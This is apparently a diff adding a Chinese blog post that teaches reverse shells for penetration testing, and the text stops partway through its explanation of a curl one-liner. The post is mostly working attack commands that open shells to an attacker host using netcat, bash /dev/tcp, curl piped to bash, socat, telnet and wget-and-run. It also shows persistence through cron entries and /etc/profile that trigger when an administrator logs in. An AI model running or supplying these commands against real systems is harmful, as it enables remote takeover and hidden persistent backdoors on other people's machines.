@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Whhxy4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。 反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。 正向连接假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="http://example.com/2023/10/28/%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="W火火">
+<meta property="og:description" content="前言在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。 反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。 正向连接假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/10/28/%E5%8F%8D%E5%BC%B9shell/1698508151069.png">
+<meta property="article:published_time" content="2023-10-28T12:58:04.000Z">
+<meta property="article:modified_time" content="2023-10-28T15:55:06.951Z">
+<meta property="article:author" content="Whhxy4">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/10/28/%E5%8F%8D%E5%BC%B9shell/1698508151069.png">
+  
+  
+  
+  <title>反弹shell - W火火</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>W火火</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="反弹shell"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-28 20:58" pubdate>
+          2023年10月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          102 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">反弹shell</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。</p>
+<p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>那么为什么要用反弹shell呢？</p>
+<p>反弹shell通常适用于如下几种情况：</p>
+<ul>
+<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
+<li>目标机端口被占用。</li>
+<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li>
+<li>……</li>
+</ul>
+<p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
+<p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>
+<p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p>
+<h2 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h2><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p>
+<p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss">wget https:<span class="hljs-comment">//nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br>tar -xvzf netcat<span class="hljs-number">-0.7</span><span class="hljs-number">.1</span>.tar.gz<br>./configure<br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br><span class="hljs-built_in">make</span> clean<br></code></pre></td></tr></table></figure>
+
+<p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netcat</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netcat</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span> <span class="hljs-number">2333</span> -e /bin/bash<br><span class="hljs-comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a>利用Bash反弹shell</h2><p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.xxx.xxx.72/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>或<br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span><br># bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/攻击机IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>以下是针对Bash反弹一句话进行了拆分说明：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>命令详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>产生一个bash交互环境。</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
+</tr>
+<tr>
+<td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td>
+<td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
+</tr>
+<tr>
+<td>0&gt;&amp;1</td>
+<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
+</tr>
+</tbody></table>
+<p>Bash反弹一句完整的解读过程就是：</p>
+<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
+</blockquote>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Linux shell下有三种标准的文件描述符，分别如下：<br><span class="hljs-number">0</span> - stdin 代表标准输入,使用&lt;或&lt;&lt;<br><span class="hljs-number">1</span> - stdout 代表标准输出,使用&gt;或&gt;&gt;<br><span class="hljs-number">2</span> - stderr 代表标准错误输出,使用<span class="hljs-number">2</span>&gt;或<span class="hljs-number">2</span>&gt;&gt;<br><br>还有就是&gt;<span class="hljs-meta">&amp;这个符号的含义，最好的理解是这样的：</span><br>当&gt;<span class="hljs-meta">&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</span><br>当&gt;<span class="hljs-meta">&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</span><br><br>理解了上面这些知识，下面来解释一下这一条反弹shell的命令<br>bash -i代表在本地打开一个交互式bash，<br>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，<br>&gt;<span class="hljs-meta">&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，</span><br>如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在目标机输入命令，<br>输出以及错误输出的内容就会被传递显示到远程。<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h3><p>这里操作也很简单，借助了Linux中的管道。</p>
+<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>并开启2333端口的监听。</p>
+<p>然后再目标机上执行如下，即可反弹shell：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>|bash<br></code></pre></td></tr></table></figure>
+
+<p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p>
+<p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，<code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
+<h3 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a>将反弹shell的命令写入定时任务</h3><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">*<span class="hljs-regexp">/1  *  *  *  *   /</span>bin<span class="hljs-regexp">/bash -i&gt;&amp;/</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="将反弹shell的命令写入-etc-profile文件"><a href="#将反弹shell的命令写入-etc-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h3><p>将以下反弹shell的命写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.xxx.xxx.72/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br><span class="hljs-comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span><br></code></pre></td></tr></table></figure>
+
+<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：</p>
+<h2 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h2><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：<a target="_blank" rel="noopener" href="http://brieflyx.me/2015/linux-tools/socat-introduction/">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></p>
+<p>安装Socat的方法很简单：</p>
+<ul>
+<li>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装</li>
+<li>也可以去官网下载源码包：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat">http://www.dest-unreach.org/socat</a></li>
+</ul>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">socat</span> TCP-LISTEN:<span class="hljs-number">2333</span> -<br>或<br>nc -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-connect:<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>:<span class="hljs-number">2333</span> exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane<br></code></pre></td></tr></table></figure>
+
+<h2 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h2><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mknod</span> a p; telnet <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span> <span class="hljs-number">2333</span> <span class="hljs-number">0</span>&lt;a | /bin/bash <span class="hljs-number">1</span>&gt;a<br></code></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>攻击机需要开启两个本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> <span class="hljs-number">47.101.57.72</span> <span class="hljs-number">2333</span> | /bin/bash | telnet <span class="hljs-number">47.101.57.72</span> <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a>wget方式反弹shell</h2><p>利用wget进行下载执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php<br></code></pre></td></tr></table></figure>
+
+<p>利用下面贴出的php进行反弹。<br>开启监听</p>
+<p><img src="/2023/10/28/%E5%8F%8D%E5%BC%B9shell/1698508151069.png" srcset="/img/loading.gif" lazyload alt="1698508151069"></p>
+<h2 id="curl-反弹-shell-原理"><a href="#curl-反弹-shell-原理" class="headerlink" title="curl 反弹 shell 原理"></a>curl 反弹 shell 原理</h2><p>在某<a target="_blank" rel="noopener" href="https://twitter.com/joevennix/status/1258613994681544704">社交网站</a>上看到一句 curl 反弹 shell 命令：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123; curl -sNkT . https:<span class="hljs-regexp">//</span><span class="hljs-variable">$LHOST</span>:<span class="hljs-variable">$LPORT</span> &lt;<span class="hljs-regexp">/dev/</span>fd/<span class="hljs-number">3</span>| sh <span class="hljs-number">3</span>&gt;&amp;-;&#125; <span class="hljs-number">3</span>&gt;&amp;<span class="hljs-number">1</span>|:<br></code></pre></td></tr></table></figure>
+
+<p>这句命令就像魔法一样神奇，和常见的反弹 shell 命令大相径庭。我花了些时间才理解它是如何工作的。</p>
+<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="冒号"><a href="#冒号" class="headerlink" title="冒号"></a>冒号</h4><p>命令的最后一个字符冒号是个鲜为人知的 Bash 内置命令，用 <code>man bash</code> 查看手册可以找到如下的说明：</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">: <span class="hljs-comment">[参数]</span><br>    无效；除了扩展参数和执行任何指定的重定向外，该命令没有任何作用。返回的退出码为 0。<br></code></pre></td></tr></table></figure>
+
+<h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h4><p>在 Bash 中，花括号有多种不同的用法，详情见《[浅析 Bash 中的 {花括号}]》。在我们尝试理解的魔法命令中用到了其中一种：可以在花括号中写多条命令，这些命令构成一个命令组，花括号后的重定向将对命令组中所有命令生效。</p>
+<p>例如执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">echo</span> 1 ; <span class="hljs-built_in">echo</span> 2 ; &#125; &gt; out.txt<br></code></pre></td></tr></table></figure>
+
+<p>会发现屏幕没有任何输出，<code>out.txt</code> 的内容是：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>2<br></code></pre></td></tr></table></figure>
+
+<p>可见两条 <code>echo</code> 命令的标准输出都被重定向到了文件 <code>out.txt</code>。</p>
+<p>需要注意的是，命令组中最后一条命令的后面也需要添加分号，以明确标识命令结束，否则 Bash 的语法解析器将无法正确解析。</p>
+<p>另外，命令组的重定向优先级低于组内命令自身的重定向。例如执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">echo</span> 1 &gt; inner.txt ; <span class="hljs-built_in">echo</span> 2 ; &#125; &gt; outer.txt<br></code></pre></td></tr></table></figure>
+
+<p>会发现第一个 <code>echo</code> 命令的输出被重定向到了 <code>inner.txt</code>，而不是 <code>outer.txt</code>。</p>
+<h4 id="dev-fd"><a href="#dev-fd" class="headerlink" title="&#x2F;dev&#x2F;fd&#x2F;"></a>&#x2F;dev&#x2F;fd&#x2F;</h4><p><code>/dev/fd/</code> 是指向 <code>/proc/self/fd</code> 的软链接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /dev/fd<br>lrwxrwxrwx 1 root root 13 Jan 30 12:23 /dev/fd -&gt; /proc/self/fd<br></code></pre></td></tr></table></figure>
+
+<p><code>/proc/self</code> 是一个特殊的软链接。当有进程查询该软链接的值时，Linux 内核会将 <code>/proc/self</code> 指向 <code>/proc/&lt;该进程的 PID&gt;</code>。</p>
+<h4 id="curl-参数"><a href="#curl-参数" class="headerlink" title="curl 参数"></a>curl 参数</h4><p>使用 <code>man curl</code> 可以查询到魔法命令中 curl 各个参数的含义，整理后列举如下：</p>
+<ul>
+<li>-s, –silent：不显示进度或错误信息。但仍会传输指定数据或输出内容到 <code>stdout</code>。</li>
+<li>-N, –no-buffer：禁用输出流的缓冲功能。正常情况下，curl 会使用一个标准的缓冲输出流，它的作用是将数据分块输出，而不是数据到达后立即输出。可使用该选项禁用这种缓冲。</li>
+<li>-k, –insecure：忽略证书错误。</li>
+<li>-T, –upload-file ：上传指定本地文件到远程 URL。可用 <code>-</code> 做文件名以从 <code>stdin</code> 读取文件内容；也可用 <code>.</code> 做文件名，以非阻塞模式从 <code>stdin</code> 读取文件内容。非阻塞模式是指可从 <code>stdin</code> 读取文件内容的同时读取服务端输出。</li>
+</ul>
